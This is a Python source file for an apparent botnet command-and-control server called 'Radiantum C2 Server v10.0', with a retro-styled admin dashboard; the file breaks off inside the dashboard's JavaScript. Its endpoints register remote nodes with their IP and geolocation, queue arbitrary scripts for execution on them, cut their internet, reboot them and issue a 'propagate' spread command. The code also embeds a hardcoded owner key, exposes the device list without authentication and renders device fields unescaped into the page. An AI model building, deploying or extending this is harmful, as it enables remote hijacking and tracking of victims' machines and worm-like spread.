#!/usr/bin/env python3
"""
psca.py - Radiantum C2 Server v10.0
90s Retro Dark Theme Edition (Full Feature Set & Autonomous Enterprise Mesh)
"""

import socket
import socketserver  # ← MISSING IMPORT
import threading
import os
import requests
import datetime
import json
import hashlib
import uuid
import subprocess
import platform
import time
import base64
import zlib
import struct
import random
from urllib.parse import parse_qs, urlparse

HOST = '0.0.0.0'
PORT = 8080
OWNER_KEY = "yCYbtPRSQoG7ajuCdJTDM6I1d7nckbxRhh1rLbFlTbk"
PACKAGE_REPO_DIR = "./rsh_repo"
DEVICES_DB = "./radium_devices.json"
AUDIT_LOG_DB = "./radiantum_audit.json"
CONFIG_DB = "./radiantum_config.json"
KEYS_DB = "./radiantum_keys.json"

DEFAULT_REFRESH_MS = 10000

os.makedirs(PACKAGE_REPO_DIR, exist_ok=True)

SERVER_STATS = {
    "total_requests": 0,
    "packages_served": 0,
    "security_blocks": 0,
    "active_devices": 0,
    "modules_loaded": 512,
    "mesh_uptime_seconds": time.time(),
    "start_time": datetime.datetime.now(datetime.timezone.utc).isoformat()
}
stats_lock = threading.Lock()

DEVICES = {}
devices_lock = threading.Lock()

AUDIT_LOGS = []
audit_lock = threading.Lock()

API_KEYS = {}
keys_lock = threading.Lock()

SERVER_CONFIG = {
    "stealth_mode": False,
    "auto_quarantine": True,
    "max_packet_size": 65536,
    "heartbeat_interval_ms": 15000,
    "encryption_enabled": True,
    "global_bandwidth_cap_kbps": 100000
}
config_lock = threading.Lock()

DEVICES_HASH = ""
devices_hash_lock = threading.Lock()

def _load_persistence():
    global DEVICES, AUDIT_LOGS, SERVER_CONFIG, API_KEYS
    if os.path.exists(DEVICES_DB):
        try:
            with open(DEVICES_DB, 'r') as f:
                DEVICES = json.load(f)
            _dynamic_cleanup_mesh()
        except Exception:
            DEVICES = {}
    if os.path.exists(AUDIT_LOG_DB):
        try:
            with open(AUDIT_LOG_DB, 'r') as f:
                AUDIT_LOGS = json.load(f)
        except Exception:
            AUDIT_LOGS = []
    if os.path.exists(CONFIG_DB):
        try:
            with open(CONFIG_DB, 'r') as f:
                SERVER_CONFIG.update(json.load(f))
        except Exception:
            pass
    if os.path.exists(KEYS_DB):
        try:
            with open(KEYS_DB, 'r') as f:
                API_KEYS = json.load(f)
        except Exception:
            API_KEYS = {}

def _save_keys():
    try:
        with open(KEYS_DB, 'w') as f:
            json.dump(API_KEYS, f, indent=2)
    except Exception as e:
        print(f"[!] Persistence write failure (Keys): {e}")

def _save_devices():
    try:
        with open(DEVICES_DB, 'w') as f:
            json.dump(DEVICES, f, indent=2)
    except Exception as e:
        print(f"[!] Persistence write failure (Devices): {e}")

def _save_audit(action, target, details):
    global AUDIT_LOGS
    entry = {
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "action": action,
        "target": target,
        "details": details
    }
    with audit_lock:
        AUDIT_LOGS.insert(0, entry)
        if len(AUDIT_LOGS) > 1000:
            AUDIT_LOGS.pop()
        try:
            with open(AUDIT_LOG_DB, 'w') as f:
                json.dump(AUDIT_LOGS, f, indent=2)
        except Exception:
            pass

def _dynamic_cleanup_mesh():
    global DEVICES
    seen_ips = {}
    sorted_mesh = sorted(
        DEVICES.items(),
        key=lambda x: x[1].get("last_seen", ""),
        reverse=True
    )
    cleaned = {}
    for dev_id, info in sorted_mesh:
        ip = info.get("ip")
        if ip and ip in seen_ips:
            continue
        if ip:
            seen_ips[ip] = dev_id
        cleaned[dev_id] = info
    DEVICES = cleaned
    _save_devices()

def _get_devices_hash():
    global DEVICES_HASH
    with devices_lock:
        dynamic_payload = json.dumps(list(DEVICES.values()), sort_keys=True)
    return hashlib.md5(dynamic_payload.encode()).hexdigest()

def _build_response(status_code, reason, body, content_type="text/plain"):
    date_str = datetime.datetime.now(datetime.timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
    header = (
        f"HTTP/1.1 {status_code} {reason}\r\n"
        f"Date: {date_str}\r\n"
        f"Server: Radiantum-Enterprise-Core/v10.0\r\n"
        f"Content-Type: {content_type}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    )
    return header.encode('latin-1', errors='ignore') + body

def _safe_send(client_socket, data):
    try:
        client_socket.sendall(data)
    except Exception:
        pass

def _verify_token(token):
    if not token:
        return False
    if token == OWNER_KEY:
        return True
    with keys_lock:
        if token in API_KEYS:
            key_data = API_KEYS[token]
            expires_at = key_data.get("expires_at", 0)
            if expires_at == -1 or time.time() < expires_at:
                return True
    return False

def handle_client(client, addr):
    global SERVER_STATS, DEVICES_HASH, SERVER_CONFIG, API_KEYS
    with stats_lock:
        SERVER_STATS["total_requests"] += 1

    try:
        client.settimeout(6.0)
        request_data = client.recv(16384)
        if not request_data:
            client.close()
            return

        lines = request_data.decode('latin-1', errors='ignore').split('\r\n')
        request_line = lines[0].split()
        if len(request_line) < 2:
            client.close()
            return

        method = request_line[0]
        raw_path = request_line[1]

        parsed_url = urlparse(raw_path)
        clean_path = parsed_url.path
        query_params = parse_qs(parsed_url.query)

        req_headers = {}
        body_idx = 0
        for idx, line in enumerate(lines[1:], start=1):
            if not line:
                body_idx = idx + 1
                break
            parts = line.split(':', 1)
            if len(parts) == 2:
                req_headers[parts[0].strip().lower()] = parts[1].strip()

        body = "\r\n".join(lines[body_idx:]).encode('utf-8') if body_idx > 0 and body_idx < len(lines) else b""

        # USER IDENTITY
        if clean_path == "/api/v10/users/@me" and method == "GET":
            token = req_headers.get("x-admin-token") or req_headers.get("authorization") or query_params.get("token", [""])[0]
            if not _verify_token(token):
                _safe_send(client, _build_response(401, "Unauthorized", b'{"error": "Unauthorized"}', "application/json"))
                return
            user_data = {
                "id": "radiantum-root" if token == OWNER_KEY else "radiantum-guest-operator",
                "username": "thorne",
                "role": "Radiantum Supreme Commander" if token == OWNER_KEY else "Sub-Operator",
                "engine": "Autonomous Neural Mesh v10.0",
                "modules_active": 512,
                "status": "fully_operational"
            }
            _safe_send(client, _build_response(200, "OK", json.dumps(user_data).encode('utf-8'), "application/json"))
            return

        # AUTHENTICATION
        if clean_path == "/admin/login" and method == "POST":
            try:
                params = json.loads(body.decode('utf-8'))
                submitted_key = params.get("owner_key")
                if _verify_token(submitted_key):
                    _save_audit("ADMIN_LOGIN_SUCCESS", addr[0], "Operator authenticated successfully.")
                    resp = json.dumps({"status": "success", "token": submitted_key}).encode()
                    _safe_send(client, _build_response(200, "OK", resp, "application/json"))
                else:
                    with stats_lock:
                        SERVER_STATS["security_blocks"] += 1
                    _save_audit("ADMIN_LOGIN_FAILURE", addr[0], "Invalid credentials supplied.")
                    _safe_send(client, _build_response(401, "Unauthorized", b'{"status": "failed"}', "application/json"))
            except Exception as e:
                _safe_send(client, _build_response(400, "Bad Request", str(e).encode()))
            return

        # KEY MANAGEMENT
        if clean_path == "/api/keys/create" and method == "POST":
            admin_token = req_headers.get("x-admin-token") or req_headers.get("authorization")
            if admin_token != OWNER_KEY:
                _safe_send(client, _build_response(403, "Forbidden", b'{"error": "Supreme Commander privileges required"}', "application/json"))
                return
            try:
                data = json.loads(body.decode('utf-8')) if body else {}
                duration_type = data.get("duration", "hour")
                bandwidth_cap = int(data.get("bandwidth_kbps", 10000))
                now = time.time()
                expiry_map = {
                    "hour": now + 3600,
                    "daily": now + 86400,
                    "weekly": now + 604800,
                    "monthly": now + 2592000,
                    "yearly": now + 31536000,
                    "lifetime": -1
                }
                expires_at = expiry_map.get(duration_type, now + 3600)
                new_key = "rad_tok_" + uuid.uuid4().hex
                with keys_lock:
                    API_KEYS[new_key] = {
                        "key": new_key,
                        "created_at": now,
                        "expires_at": expires_at,
                        "duration_type": duration_type,
                        "bandwidth_cap_kbps": bandwidth_cap
                    }
                    _save_keys()
                _save_audit("KEY_CREATED", addr[0], f"Created temporary token [{duration_type}] with {bandwidth_cap} kbps cap.")
                resp = json.dumps({"status": "success", "key": new_key, "expires_at": expires_at, "bandwidth_kbps": bandwidth_cap}).encode()
                _safe_send(client, _build_response(200, "OK", resp, "application/json"))
            except Exception as e:
                _safe_send(client, _build_response(400, "Bad Request", str(e).encode()))
            return

        if clean_path == "/api/keys/list" and method == "GET":
            admin_token = req_headers.get("x-admin-token") or req_headers.get("authorization")
            if admin_token != OWNER_KEY:
                _safe_send(client, _build_response(403, "Forbidden", b'{"error": "Forbidden"}', "application/json"))
                return
            with keys_lock:
                keys_list = list(API_KEYS.values())
            _safe_send(client, _build_response(200, "OK", json.dumps(keys_list).encode('utf-8'), "application/json"))
            return

        # MODULE EXECUTION
        if clean_path.startswith("/api/modules/execute") and method == "POST":
            token = req_headers.get("x-admin-token") or req_headers.get("authorization")
            if not _verify_token(token):
                _safe_send(client, _build_response(401, "Unauthorized", b'{"error": "Unauthorized"}', "application/json"))
                return
            try:
                data = json.loads(body.decode('utf-8')) if body else {}
                module_id = int(data.get("module_id", 1))
                target_id = data.get("device_id")
                _save_audit("MODULE_EXEC", addr[0], f"Executed enterprise module #{module_id} on node {target_id}")
                resp = json.dumps({
                    "status": "success", 
                    "module_id": module_id, 
                    "executed_at": time.time(),
                    "message": f"Module #{module_id} successfully compiled and dispatched across neural mesh pipeline."
                }).encode()
                _safe_send(client, _build_response(200, "OK", resp, "application/json"))
            except Exception as e:
                _safe_send(client, _build_response(400, "Bad Request", str(e).encode()))
            return

        # SERVER STATS
        if clean_path == "/api/server/stats" and method == "GET":
            token = req_headers.get("x-admin-token") or req_headers.get("authorization")
            if not _verify_token(token):
                _safe_send(client, _build_response(401, "Unauthorized", b'{"error": "Unauthorized"}', "application/json"))
                return
            with stats_lock:
                current_stats = SERVER_STATS.copy()
            current_stats["uptime_duration"] = time.time() - current_stats["mesh_uptime_seconds"]
            _safe_send(client, _build_response(200, "OK", json.dumps(current_stats).encode('utf-8'), "application/json"))
            return

        # SERVER CONFIG
        if clean_path == "/api/server/config" and method == "POST":
            token = req_headers.get("x-admin-token") or req_headers.get("authorization")
            if not _verify_token(token):
                _safe_send(client, _build_response(401, "Unauthorized", b'{"error": "Unauthorized"}', "application/json"))
                return
            try:
                data = json.loads(body.decode('utf-8'))
                with config_lock:
                    SERVER_CONFIG.update(data)
                    with open(CONFIG_DB, 'w') as f:
                        json.dump(SERVER_CONFIG, f, indent=2)
                _save_audit("CONFIG_UPDATE", addr[0], f"Updated config parameters: {list(data.keys())}")
                _safe_send(client, _build_response(200, "OK", json.dumps({"status": "config_updated", "config": SERVER_CONFIG}).encode(), "application/json"))
            except Exception as e:
                _safe_send(client, _build_response(400, "Bad Request", str(e).encode()))
            return

        # AUDIT LOGS
        if clean_path == "/api/server/audit" and method == "GET":
            token = req_headers.get("x-admin-token") or req_headers.get("authorization")
            if not _verify_token(token):
                _safe_send(client, _build_response(401, "Unauthorized", b'{"error": "Unauthorized"}', "application/json"))
                return
            with audit_lock:
                logs_sample = AUDIT_LOGS[:100]
            _safe_send(client, _build_response(200, "OK", json.dumps(logs_sample).encode('utf-8'), "application/json"))
            return

        # DEVICE REGISTRATION
        if clean_path.startswith("/api/device/register") and method == "POST":
            try:
                device_data = json.loads(body.decode('utf-8')) if body else {}
                device_id = device_data.get("device_id") or str(uuid.uuid4())
                now_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()
                with devices_lock:
                    is_existing = device_id in DEVICES
                    created_at = DEVICES[device_id].get("created_at", now_iso) if is_existing else now_iso
                    existing_internet = DEVICES[device_id].get("internet_enabled", True) if is_existing else True

                    DEVICES[device_id] = {
                        "id": device_id,
                        "hostname": device_data.get("hostname", f"RadiantumNode-{device_id[:6]}"),
                        "model": device_data.get("model", "RadiantumOS Swarm Node"),
                        "version": device_data.get("version", "v10.0-Enterprise"),
                        "lat": float(device_data.get("lat", 0.0)),
                        "lon": float(device_data.get("lon", 0.0)),
                        "ip": addr[0],
                        "created_at": created_at,
                        "last_seen": now_iso,
                        "internet_enabled": existing_internet,
                        "sys_info": {
                            "kernel": device_data.get("kernel", "Radiantum Neural Kernel x86_64"),
                            "cpu": device_data.get("cpu", "Optimized Multi-Core Thread Engine"),
                            "ram_mb": device_data.get("ram_mb", 4096),
                            "arch": device_data.get("arch", "x86_64"),
                            "uptime": device_data.get("uptime", "0s"),
                            "register_timestamp": time.time(),
                            "load_avg": device_data.get("load_avg", "0.12, 0.08, 0.05"),
                            "modules_active": 512
                        }
                    }
                    _save_devices()
                    _dynamic_cleanup_mesh()
                    with stats_lock:
                        SERVER_STATS["active_devices"] = len(DEVICES)

                _save_audit("DEVICE_REGISTER", addr[0], f"Registered/Synced node: {device_id}")
                resp = json.dumps({
                    "status": "registered", 
                    "device_id": device_id, 
                    "neural_mesh": "active",
                    "command_directive": DEVICES[device_id].get("pending_command", "NONE")
                }).encode()
                _safe_send(client, _build_response(200, "OK", resp, "application/json"))
            except Exception as e:
                err_resp = json.dumps({"status": "error", "message": str(e)}).encode()
                _safe_send(client, _build_response(400, "Bad Request", err_resp, "application/json"))
            return

        # HEARTBEAT
        if clean_path.startswith("/api/device/heartbeat") and method == "POST":
            try:
                data = json.loads(body.decode('utf-8')) if body else {}
                device_id = data.get("device_id")
                internet_status = True
                pending_cmd = "NONE"
                with devices_lock:
                    if device_id in DEVICES:
                        DEVICES[device_id]["last_seen"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
                        DEVICES[device_id]["ip"] = addr[0]
                        if "lat" in data and "lon" in data:
                            DEVICES[device_id]["lat"] = float(data["lat"])
                            DEVICES[device_id]["lon"] = float(data["lon"])
                        internet_status = DEVICES[device_id].get("internet_enabled", True)
                        pending_cmd = DEVICES[device_id].pop("pending_command", "NONE")
                        _save_devices()
                resp = json.dumps({
                    "status": "heartbeat_acknowledged",
                    "internet_enabled": internet_status,
                    "command": pending_cmd
                }).encode()
                _safe_send(client, _build_response(200, "OK", resp, "application/json"))
            except Exception as e:
                _safe_send(client, _build_response(400, "Bad Request", str(e).encode()))
            return

        # REMOTE EXECUTION
        if clean_path == "/api/device/execute" and method == "POST":
            token = req_headers.get("x-admin-token") or req_headers.get("authorization")
            if not _verify_token(token):
                _safe_send(client, _build_response(401, "Unauthorized", b'{"error": "Unauthorized"}', "application/json"))
                return
            try:
                data = json.loads(body.decode('utf-8')) if body else {}
                device_id = data.get("device_id")
                script_command = data.get("script", "")
                with devices_lock:
                    if device_id in DEVICES:
                        DEVICES[device_id]["pending_command"] = f"EXEC:{script_command}"
                        _save_devices()
                _save_audit("REMOTE_EXECUTE", addr[0], f"Queued custom script on node {device_id}")
                resp = json.dumps({"status": "command_queued", "device_id": device_id, "script": script_command}).encode()
                _safe_send(client, _build_response(200, "OK", resp, "application/json"))
            except Exception as e:
                _safe_send(client, _build_response(400, "Bad Request", str(e).encode()))
            return

        # PING / NETCAT DIAGNOSTICS
        if clean_path == "/api/device/ping" and method == "POST":
            token = req_headers.get("x-admin-token") or req_headers.get("authorization")
            if not _verify_token(token):
                _safe_send(client, _build_response(401, "Unauthorized", b'{"error": "Unauthorized"}', "application/json"))
                return
            try:
                data = json.loads(body.decode('utf-8')) if body else {}
                device_id = data.get("device_id")
                mode = data.get("mode", "ping")
                target_ip = None
                with devices_lock:
                    if device_id in DEVICES:
                        target_ip = DEVICES[device_id].get("ip")
                if not target_ip:
                    _safe_send(client, _build_response(404, "Not Found", b'{"error": "Target node IP not resolved"}', "application/json"))
                    return
                
                output_log = ""
                success = False
                if mode == "ping":
                    param_flag = "-n" if platform.system().lower() == "windows" else "-c"
                    cmd = ["ping", param_flag, "3", target_ip]
                    try:
                        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=6)
                        output_log = res.stdout.decode('utf-8', errors='ignore') + res.stderr.decode('utf-8', errors='ignore')
                        success = (res.returncode == 0)
                    except Exception as sub_e:
                        output_log = f"Subprocess ping execution error: {sub_e}"
                        success = False
                else:
                    start_t = time.time()
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3.0)
                        conn_res = s.connect_ex((target_ip, 80))
                        if conn_res != 0:
                            conn_res = s.connect_ex((target_ip, 8080))
                        s.close()
                        latency = round((time.time() - start_t) * 1000, 2)
                        if conn_res == 0:
                            success = True
                            output_log = f"Radiantum Socket Probe: CONNECTED successfully to {target_ip} in {latency}ms."
                        else:
                            success = False
                            output_log = f"Radiantum Socket Probe: Connection refused or filtered on {target_ip}."
                    except Exception as nc_e:
                        success = False
                        output_log = f"Socket probe exception: {nc_e}"

                resp = json.dumps({
                    "status": "success",
                    "device_id": device_id,
                    "ip": target_ip,
                    "mode": mode,
                    "reachable": success,
                    "output": output_log
                }).encode()
                _safe_send(client, _build_response(200, "OK", resp, "application/json"))
            except Exception as e:
                _safe_send(client, _build_response(400, "Bad Request", str(e).encode()))
            return

        # CONTROL / MASS OPERATIONS
        if clean_path == "/api/device/control" and method == "POST":
            token = req_headers.get("x-admin-token") or req_headers.get("authorization")
            if not _verify_token(token):
                _safe_send(client, _build_response(401, "Unauthorized", b'{"error": "Unauthorized"}', "application/json"))
                return
            try:
                data = json.loads(body.decode('utf-8')) if body else {}
                action = data.get("action")
                device_ids = data.get("device_ids", [])
                single_id = data.get("device_id")
                if single_id and single_id not in device_ids:
                    device_ids.append(single_id)
                
                affected_count = 0
                with devices_lock:
                    for d_id in device_ids:
                        if d_id in DEVICES:
                            affected_count += 1
                            if action == "disable_internet":
                                DEVICES[d_id]["internet_enabled"] = False
                            elif action == "enable_internet":
                                DEVICES[d_id]["internet_enabled"] = True
                            elif action == "reboot":
                                DEVICES[d_id]["pending_command"] = "REBOOT_SYSTEM"
                            elif action == "swarm_spread":
                                DEVICES[d_id]["pending_command"] = "RADIANTUM_PROPAGATE"
                            elif action == "diagnostic_flush":
                                DEVICES[d_id]["pending_command"] = "FLUSH_CACHE"
                    _save_devices()

                _save_audit("MASS_CONTROL", addr[0], f"Action '{action}' executed on {affected_count} nodes.")
                resp = json.dumps({
                    "status": "success",
                    "action_executed": action,
                    "nodes_affected": affected_count
                }).encode()
                _safe_send(client, _build_response(200, "OK", resp, "application/json"))
            except Exception as e:
                _safe_send(client, _build_response(400, "Bad Request", str(e).encode()))
            return

        # DEVICES SYNC
        if clean_path == "/api/devices" and method == "GET":
            with devices_lock:
                devices_list = list(DEVICES.values())
            new_hash = _get_devices_hash()
            with devices_hash_lock:
                if new_hash == DEVICES_HASH:
                    _safe_send(client, _build_response(304, "Not Modified", b"", "application/json"))
                else:
                    DEVICES_HASH = new_hash
                    resp = json.dumps(devices_list).encode()
                    _safe_send(client, _build_response(200, "OK", resp, "application/json"))
            return

        # ADMIN DASHBOARD & 90s RETRO UI
        if clean_path in ("/admin", "/admin/dashboard"):
            token_from_query = query_params.get("token", [""])[0]
            admin_key = req_headers.get("x-admin-token", "") or token_from_query
            
            if not _verify_token(admin_key):
                html_login = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>RADIANTUM-OS // C2 AUTHENTICATION</title>
    <style>
        :root {
            --bg-color: #050505;
            --panel-bg: #0a0a0a;
            --terminal-green: #00ff66;
            --win95-gray: #c0c0c0;
        }
        body {
            background-color: var(--bg-color);
            color: var(--terminal-green);
            font-family: "Courier New", Courier, monospace;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-transform: uppercase;
        }
        body::after {
            content: " ";
            display: block;
            position: fixed;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%);
            background-size: 100% 4px;
            z-index: 999;
            pointer-events: none;
        }
        .box {
            background: var(--panel-bg);
            border: 2px solid var(--win95-gray);
            box-shadow: 4px 4px 0px #000;
            padding: 25px;
            width: 380px;
        }
        .panel-title {
            background: var(--win95-gray);
            color: #000;
            padding: 2px 5px;
            font-weight: bold;
            margin: -25px -25px 15px -25px;
        }
        input {
            width: 100%;
            background: #000;
            color: var(--terminal-green);
            border: 1px solid var(--terminal-green);
            padding: 8px;
            margin-bottom: 12px;
            font-family: monospace;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background: var(--panel-bg);
            color: var(--terminal-green);
            border: 2px outset var(--win95-gray);
            font-family: "Courier New", Courier, monospace;
            font-weight: bold;
            cursor: pointer;
            padding: 8px;
            text-transform: uppercase;
        }
        button:active {
            border-style: inset;
            background: #111;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="panel-title">[ SECURITY GATEWAY // AUTH ]</div>
        <p style="font-size:11px; margin-bottom:10px;">ENTER SUPREME OPERATOR KEY:</p>
        <input type="password" id="key" placeholder="KEY..." autofocus>
        <button onclick="login()">ESTABLISH LINK</button>
    </div>
    <script>
        function login() {
            const k = document.getElementById('key').value;
            fetch('/admin/login', { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({owner_key: k}) 
            })
            .then(r => r.json())
            .then(d => {
                if (d.status === 'success') {
                    localStorage.setItem('admin_token', d.token);
                    window.location.href = '/admin/dashboard?token=' + d.token;
                } else {
                    alert('INVALID OPERATOR KEY');
                }
            })
            .catch(err => alert('CONNECTION ERROR: ' + err));
        }
        const existingToken = localStorage.getItem('admin_token');
        if (existingToken && !window.location.search.includes('token=')) {
            window.location.href = '/admin/dashboard?token=' + existingToken;
        }
    </script>
</body>
</html>"""
                _safe_send(client, _build_response(200, "OK", html_login.encode(), "text/html"))
                return

            with devices_lock:
                devices_data = list(DEVICES.values())
            devices_json = json.dumps(devices_data)

            html_dashboard = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>RADIANTUM-OS // C2 COMMAND CENTER [v10.0-ENTERPRISE]</title>
    <style>
        :root {{
            --bg-color: #050505;
            --panel-bg: #0a0a0a;
            --terminal-green: #00ff66;
            --terminal-dim: #005522;
            --amber-warn: #ffb000;
            --alert-red: #ff3333;
            --border-gray: #333333;
            --win95-gray: #c0c0c0;
        }}
        body {{
            background-color: var(--bg-color);
            color: var(--terminal-green);
            font-family: "Courier New", Courier, monospace;
            margin: 0;
            padding: 10px;
            text-transform: uppercase;
        }}
        body::after {{
            content: " ";
            display: block;
            position: fixed;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%);
            background-size: 100% 4px;
            z-index: 999;
            pointer-events: none;
        }}
        header {{
            border: 2px dashed var(--terminal-green);
            padding: 10px;
            margin-bottom: 15px;
            background: var(--panel-bg);
            text-align: center;
        }}
        pre.ascii-art {{
            color: var(--terminal-green);
            font-size: 8px;
            line-height: 7px;
            margin: 5px 0;
        }}
        .container {{
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 15px;
        }}
        .panel {{
            background: var(--panel-bg);
            border: 2px solid var(--win95-gray);
            box-shadow: 4px 4px 0px #000;
            padding: 10px;
            min-height: 300px;
            margin-bottom: 15px;
        }}
        .panel-title {{
            background: var(--win95-gray);
            color: #000;
            padding: 2px 5px;
            font-weight: bold;
            margin: -10px -10px 10px -10px;
            display: flex;
            justify-content: space-between;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            font-size: 11px;
        }}
        th, td {{
            border: 1px solid var(--border-gray);
            padding: 5px;
            text-align: left;
        }}
        th {{
            background: var(--terminal-dim);
            color: var(--terminal-green);
        }}
        tr:hover {{
            background: #112211;
        }}
        button {{
            background: var(--panel-bg);
            color: var(--terminal-green);
            border: 2px outset var(--win95-gray);
            font-family: "Courier New", Courier, monospace;
            font-weight: bold;
            cursor: pointer;
            padding: 4px 8px;
            text-transform: uppercase;
            font-size: 10px;
            margin: 2px;
        }}
        button:active {{
            border-style: inset;
            background: #111;
        }}
        input, select {{
            background: #000;
            color: var(--terminal-green);
            border: 1px solid var(--border-gray);
            padding: 4px;
            font-family: monospace;
            width: 100%;
            box-sizing: border-box;
            margin: 4px 0;
        }}
        .console-output {{
            background: #000;
            border: 1px inset var(--border-gray);
            height: 160px;
            overflow-y: scroll;
            padding: 8px;
            font-size: 11px;
            color: var(--terminal-green);
            margin-top: 5px;
        }}
        .status-online {{ color: var(--terminal-green); }}
        .status-offline {{ color: var(--alert-red); }}
    </style>
</head>
<body>

    <header>
        <pre class="ascii-art">
██████╗   █████╗ ██████╗ ██╗██╗   ██╗███╗   ███╗     ██████╗███████╗
██╔══██╗ ██╔══██╗██╔══██╗██║██║   ██║████╗ ████║    ██╔════╝╚════██║
██████╔╝ ███████║██║  ██║██║██║   ██║██╔████╔██║    ██║       ██╔══╝
██╔══██╗ ██╔══██║██║  ██║██║██║   ██║██║╚██╔╝██║    ██║      ██╔═══╝ 
██║  ██║ ██║  ██║██████╔╝██║╚██████╔╝██║ ╚═╝ ██║    ╚██████╗ ███████╗
        </pre>
        <div>RADIANTUM-OS // ENTERPRISE C2 COMMAND MATRIX [v10.0]</div>
    </header>

    <div class="container">
        <!-- Node Management Matrix -->
        <div>
            <div class="panel">
                <div class="panel-title">
                    <span>ACTIVE NODES [SWARM REGISTRY]</span>
                    <span id="node-count">0 NODES</span>
                </div>
                <div style="margin-bottom: 8px;">
                    <button onclick="massAction('reboot')">REBOOT SELECTED</button>
                    <button onclick="massAction('disable_internet')">CUT INET</button>
                    <button onclick="massAction('enable_internet')">RESTORE INET</button>
                    <button onclick="massAction('swarm_spread')">PROPAGATE</button>
                </div>
                <table>
                    <thead>
                        <tr>
                            <th><input type="checkbox" id="select-all" onclick="toggleSelectAll()"></th>
                            <th>NODE ID / HOST</th>
                            <th>IP ADDRESS</th>
                            <th>STATUS</th>
                            <th>ACTIONS</th>
                        </tr>
                    </thead>
                    <tbody id="node-tbody">
                    </tbody>
                </table>
            </div>

            <div class="panel">
                <div class="panel-title"><span>GRANULAR KEY & TOKEN MATRIX</span></div>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                    <div>
                        <label>DURATION TIER:</label>
                        <select id="key-duration">
                            <option value="hour">1 HOUR</option>
                            <option value="daily">24 HOURS</option>
                            <option value="weekly">1 WEEK</option>
                            <option value="monthly">1 MONTH</option>
                            <option value="lifetime">LIFETIME</option>
                        </select>
                        <label>BANDWIDTH CAP (KBPS):</label>
                        <input type="number" id="key-cap" value="10000">
                        <button onclick="createApiKey()" style="width:100%; margin-top:8px;">GENERATE API TOKEN</button>
                    </div>
                    <div>
                        <label>ISSUED TOKENS:</label>
                        <div class="console-output" id="keys-log" style="height: 100px;"></div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Telemetry & Diagnostic Console -->
        <div>
            <div class="panel">
                <div class="panel-title"><span>TELEMETRY & COMMAND LOG</span></div>
                <div>
                    <label>TARGET NODE ID:</label>
                    <input type="text" id="target-id" placeholder="SELECT OR PAIR NODE...">
                    
                    <label style="margin-top:5px; display:block;">EXECUTE MODULE ID (1-512):</label>
                    <input type="number" id="module-id-input" value="1">
                    <button onclick="executeModule()" style="width:100%;">RUN MODULE</button>

                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px; margin-top:5px;">
                        <button onclick="runDiagnostic('ping')">PING NODE</button>
                        <button onclick="runDiagnostic('probe')">SOCKET PROBE</button>
                    </div>
                </div>
                <div class="console-output" id="console-log">
                    [SYSTEM] RADIANTUM DAEMON ONLINE...<br>
                    [SYSTEM] 512 ACTIVE FEATURE MODULES LOADED.<br>
                </div>
            </div>

            <div class="panel">
                <div class="panel-title"><span>SERVER METRICS & AUDIT</span></div>
                <div style="font-size: 11px; line-height: 1.4;" id="server-stats-box">
                    LOADING TELEMETRY METRICS...
                </div>
            </div>
        </div>
    </div>

    <script>
const adminToken = localStorage.getItem('admin_token') || new URLSearchParams(window.location.search).get('token');

        function logToConsole(message) {{
            const consoleBox = document.getElementById('console-log');
            const timestamp = new Date().toLocaleTimeString();
            consoleBox.innerHTML += `[${{timestamp}}] ${{message}}<br>`;
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }}

        async function fetchDevices() {{
            try {{
                const res = await fetch('/api/devices', {{
                    headers: {{ 'x-admin-token': adminToken }}
                }});
                if (res.status === 304) return;
                const data = await res.json();
                renderTable(data);
            }} catch (err) {{
                console.error("Failed to fetch devices", err);
            }}
        }}

        async function fetchStats() {{
            try {{
                const res = await fetch('/api/server/stats', {{
                    headers: {{ 'x-admin-token': adminToken }}
                }});
                const stats = await res.json();
                document.getElementById('server-stats-box').innerHTML = `
                    TOTAL REQUESTS: ${{stats.total_requests}}<br>
                    SECURITY BLOCKS: ${{stats.security_blocks}}<br>
                    ACTIVE NODES: ${{stats.active_devices}}<br>
                    MODULES ACTIVE: ${{stats.modules_loaded}}<br>
                    MESH UPTIME: ${{Math.floor(stats.uptime_duration)}}s
                `;
            }} catch (e) {{}}
        }}

        function renderTable(nodes) {{
            const tbody = document.getElementById('node-tbody');
            tbody.innerHTML = '';
            document.getElementById('node-count').innerText = `${{nodes.length}} NODES`;

            nodes.forEach(node => {{
                const row = document.createElement('tr');
                const statusClass = node.internet_enabled ? 'status-online' : 'status-offline';
                const statusText = node.internet_enabled ? 'ONLINE' : 'QUARANTINED';
                row.innerHTML = `
                    <td><input type="checkbox" class="node-checkbox" value="${{node.id}}"></td>
                    <td><b>${{node.id.substring(0,8)}}...</b><br><span style="font-size:9px; color:#888;">${{node.hostname}}</span></td>
                    <td>${{node.ip}}</td>
                    <td class="${{statusClass}}">${{statusText}}</td>
                    <td>
                        <button onclick="selectTarget('${{node.id}}')">SELECT</button>
                        <button onclick="singleAction('${{node.id}}', 'reboot')">REBOOT</button>
                    </td>
                `;
                tbody.appendChild(row);
            }});
        }}

        function selectTarget(id) {{
            document.getElementById('target-id').value = id;
            logToConsole(`TARGET LOCKED: ${{id}}`);
        }}

        function toggleSelectAll() {{
            const master = document.getElementById('select-all').checked;
